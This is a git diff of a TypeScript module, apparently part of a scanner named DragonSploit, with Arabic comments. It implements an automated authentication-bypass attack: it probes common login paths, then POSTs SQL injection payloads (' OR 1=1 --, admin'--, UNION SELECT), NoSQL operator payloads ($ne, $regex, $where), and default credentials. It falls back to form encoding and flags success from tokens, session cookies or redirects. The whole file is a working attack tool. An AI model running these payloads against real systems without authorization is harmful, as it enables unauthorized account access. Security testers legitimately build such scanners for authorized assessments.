@@ -1,111 +1,155 @@
 import { Job } from 'bullmq';
 import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
-import axios from 'axios';
-import { URL, URLSearchParams } from 'url'; // ✅ استيراد URLSearchParams
-import { recordVulnerability } from './common';
+import { URL, URLSearchParams } from 'url';
+import { recordVulnerability, executeRequest, RequestResult } from './common';
+import axios, { AxiosRequestConfig } from 'axios'; // نحتاج axios للـ POST المخصص هنا
 
-// ✅ تعريف نوع أكثر دقة للحمولات للسماح بالكائنات المتداخلة
+// ============================================================================
+// 🛠️ TYPES & INTERFACES
+// ============================================================================
+
 type PayloadValue = string | { [key: string]: any };
+
 interface BypassPayload {
     email: PayloadValue;
     password: PayloadValue;
 }
 
+interface BypassTechnique {
+    name: string;
+    payload: BypassPayload;
+}
+
+// ============================================================================
+// 🛡️ ATTACK LOGIC
+// ============================================================================
+
 export async function executeAuthBypassAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
     const { targetUrl, scanId } = job.data;
-    console.log('[Vector 0] Starting Authentication Bypass Attack...');
-    let found = false;
+    console.log('[Vector 0] 🔓 Starting Authentication Bypass Attack...');
+    
+    let foundVulnerability = false;
 
+    // قائمة نقاط النهاية المحتملة لتسجيل الدخول (Common Login Endpoints)
     const loginEndpoints = [
         '/rest/user/login',
         '/api/login',
         '/login',
         '/signin',
         '/auth/login',
-        '/api/v1/auth/login'
+        '/api/v1/auth/login',
+        '/user/login'
     ];
 
-    const bypassTechniques: { name: string; payload: BypassPayload }[] = [
-        // --- Classic SQLi Bypasses ---
-        { name: "Classic SQLi", payload: { email: "' OR 1=1 --", password: "password" } },
-        { name: "Tautology (Username)", payload: { email: "admin'--", password: "password" } },
-        { name: "Tautology (Password)", payload: { email: "admin", password: "' OR 1=1 --" } },
-        { name: "UNION-Based (assuming 3 columns)", payload: { email: "' UNION SELECT 1, 'admin', 'password_hash' --", password: "password" } },
+    // تقنيات التخطي (Attack Dictionary)
+    const bypassTechniques: BypassTechnique[] = [
+        // --- Classic SQL Injection ---
+        { name: "Classic SQLi (OR 1=1)", payload: { email: "' OR 1=1 --", password: "password" } },
+        { name: "Admin Tautology", payload: { email: "admin'--", password: "password" } },
+        { name: "Password Bypass", payload: { email: "admin", password: "' OR '1'='1" } },
+        { name: "UNION Auth Bypass", payload: { email: "' UNION SELECT 1, 'admin', 'hash' --", password: "password" } },
         
-        // --- NoSQL Injection Bypasses (Critical for modern apps) ---
-        { name: "NoSQLi (Not Equal)", payload: { email: { "$ne": "nonexistent" }, password: { "$ne": "nonexistent" } } },
-        { name: "NoSQLi (Regex)", payload: { email: { "$regex": ".*" }, password: { "$regex": ".*" } } },
-        { name: "NoSQLi (WHERE clause JS injection)", payload: { email: "' && this.password.length > 0 && '1'=='1", password: "password" } },
+        // --- NoSQL Injection (MongoDB/CouchDB) ---
+        { name: "NoSQLi (Not Equal)", payload: { email: { "$ne": "null" }, password: { "$ne": "null" } } },
+        { name: "NoSQLi (Regex Wildcard)", payload: { email: { "$regex": ".*" }, password: { "$regex": ".*" } } },
+        { name: "NoSQLi (JS Injection)", payload: { email: "admin", password: { "$where": "function(){return true}" } } },
 
-        // --- Other Logical Flaws ---
-        { name: "Admin Account Guess", payload: { email: "admin", password: "admin" } },
+        // --- Logic Flaws ---
+        { name: "Default Creds (Admin/Admin)", payload: { email: "admin", password: "admin" } },
         { name: "Empty Password", payload: { email: "admin", password: "" } },
-        { name: "Wildcard Login", payload: { email: "*", password: "*" } }
+        { name: "SQL Wildcard (*)", payload: { email: "*", password: "*" } }
     ];
 
-    for (const path of loginEndpoints) {
-        const loginUrl = new URL(path, targetUrl).toString();
+    // حلقة فحص نقاط النهاية
+    for (const endpoint of loginEndpoints) {
+        // بناء الرابط الكامل بشكل آمن
+        const loginUrl = new URL(endpoint, targetUrl).toString();
+        
+        // تحقق سريع: هل نقطة النهاية موجودة أصلاً؟ (وفر الوقت)
+        // نرسل GET خفيف أولاً، إذا كان 404 نتخطاه
+        const checkProbe = await executeRequest(loginUrl);
+        if (checkProbe.status === 404) continue;
+
         console.log(`[Vector 0] Testing endpoint: ${loginUrl}`);
 
+        // تجربة التقنيات
         for (const technique of bypassTechniques) {
             try {
-                // Try JSON content type first
-                let response = await axios.post(loginUrl, technique.payload, {
+                // إعداد الطلب (Request Configuration)
+                const config: AxiosRequestConfig = {
+                    method: 'POST',
+                    url: loginUrl,
+                    data: technique.payload,
                     headers: { 
-                        'User-Agent': 'DragonSploit/2.0',
+                        'User-Agent': 'DragonSploit/2.0 (Auth Scanner)',
                         'Content-Type': 'application/json'
                     },
-                    validateStatus: () => true,
-                    // زيادة المهلة للتعامل مع الخوادم البطيئة
-                    timeout: 10000, 
-                });
+                    timeout: 10000,
+                    validateStatus: () => true // قبول كل الرموز للتحليل
+                };
 
-                // If JSON fails (e.g., 415 Unsupported Media Type), try form-urlencoded
-                if (response.status === 415) {
-                    const formData = new URLSearchParams();
-                    // ✅✅✅ الإصلاح الحاسم ✅✅✅
-                    // حلقة آمنة من ناحية الأنواع للتعامل مع الحمولات المعقدة
-                    for (const key of Object.keys(technique.payload) as Array<keyof BypassPayload>) {
-                        const value = technique.payload[key];
-                        if (typeof value === 'string') {
-                            formData.append(key, value);
-                        } else {
-                            // إذا كانت القيمة كائناً (لحالة NoSQLi)، قم بتحويلها إلى JSON string
-                            formData.append(key, JSON.stringify(value));
-                        }
+                // تنفيذ الطلب باستخدام Axios مباشرة هنا لأننا نحتاج POST مع Data معقدة
+                // (يمكن دمج هذا في executeRequest مستقبلاً لتوحيد الأداء)
+                let response = await axios(config);
+
+                // Fallback: إذا فشل JSON (415)، جرب Form-Encoded
+                if (response.status === 415 || response.status === 406) {
+                    const params = new URLSearchParams();
+                    for (const [key, val] of Object.entries(technique.payload)) {
+                        const strVal = typeof val === 'object' ? JSON.stringify(val) : String(val);
+                        params.append(key, strVal);
                     }
-                    response = await axios.post(loginUrl, formData.toString(), {
-                        headers: { 
-                            'User-Agent': 'DragonSploit/2.0',
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        },
-                        validateStatus: () => true,
-                        timeout: 10000,
-                    });
+                    
+                    config.headers!['Content-Type'] = 'application/x-www-form-urlencoded';
+                    config.data = params;
+                    response = await axios(config);
                 }
 
-                // Intelligent Success Detection
-                const hasToken = response.data?.token || response.data?.authentication?.token || response.data?.access_token;
-                const hasSession = response.headers['set-cookie']?.some(cookie => 
-                    /session|connect\.sid|jsessionid/i.test(cookie)
-                );
-                const isRedirectToDashboard = response.status >= 300 && response.status < 400 && response.headers.location?.match(/dashboard|account|home/i);
+                // --- Intelligent Success Analysis (تحليل النجاح الذكي) ---
+                const responseBodyStr = JSON.stringify(response.data || "").toLowerCase();
+                const responseHeadersStr = JSON.stringify(response.headers).toLowerCase();
+
+                // المؤشرات القوية (Strong Indicators)
+                const hasAuthToken = /token|bearer|jwt|access_key/.test(responseBodyStr) && responseBodyStr.length < 5000; // تجنب الإيجابيات الكاذبة في صفحات HTML الطويلة
+                const setsSessionCookie = /set-cookie/.test(responseHeadersStr) && /session|sid|auth|user/.test(responseHeadersStr);
                 
-                // ✅ إصلاح المشكلة المنطقية
-                const hasWelcomeMessage = response.data && typeof response.data === 'string' && response.data.toLowerCase().match(/welcome|logged in as/i);
+                // المؤشرات السلوكية (Behavioral Indicators)
+                // 302 Redirect إلى صفحة Dashboard أو Home
+                const isRedirectSuccess = (response.status === 302 || response.status === 301) && 
+                                          /dashboard|home|account|profile/.test(response.headers['location'] || "");
+                
+                // رسائل ترحيبية في الرد
+                const hasWelcomeMessage = /welcome|logged in|success|authenticated/.test(responseBodyStr);
 
-                if (hasToken || hasSession || isRedirectToDashboard || hasWelcomeMessage) {
-                    console.log(`[Vector 0] ✅ Authentication Bypass SUCCESS with technique: "${technique.name}"`);
-                    const proof = `Endpoint: ${loginUrl}\nTechnique: ${technique.name}\nPayload: ${JSON.stringify(technique.payload)}\nResponse Snippet: ${JSON.stringify(response.data).substring(0, 200)}...`;
-                    const description = `Logical Authentication Bypass confirmed using ${technique.name}. Access granted.`;
+                if (hasAuthToken || setsSessionCookie || isRedirectSuccess || (response.status === 200 && hasWelcomeMessage)) {
+                    console.log(`[Vector 0] ✅ AUTH BYPASS CONFIRMED: ${technique.name}`);
+                    
+                    const proof = `
+                        Endpoint: ${loginUrl}
+                        Technique: ${technique.name}
+                        Payload: ${JSON.stringify(technique.payload)}
+                        Status: ${response.status}
+                        Indicators: ${hasAuthToken ? 'Token Found ' : ''}${setsSessionCookie ? 'Session Cookie ' : ''}${isRedirectSuccess ? 'Redirected ' : ''}
+                    `.trim();
+
+                    const description = `Authentication Bypass vulnerability detected using '${technique.name}'. The scanner successfully logged in without valid credentials.`;
+                    
                     await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
-                    found = true;
-                    return found; // Stop after first success
+                    foundVulnerability = true;
+                    
+                    // توقف فوراً عند العثور على ثغرة لتوفير الوقت (Fail-Fast / Succeed-Fast)
+                    // إلا إذا كنت تريد جمع كل الطرق الممكنة
+                    return true; 
                 }
+
             } catch (error: any) {
-                console.log(`[Vector 0] ⚠️ Error with technique ${technique.name} on ${loginUrl}: ${error.message}`);
+                // تجاهل أخطاء الشبكة العابرة، وسجل الأخطاء المنطقية فقط
+                if (!error.message.includes('timeout') && !error.message.includes('ECONNRESET')) {
+                    console.warn(`[Vector 0] ⚠️ Error testing ${technique.name} on ${loginUrl}: ${error.message}`);
+                }
             }
         }
     }
-    return found;
+
+    return foundVulnerability;
 }
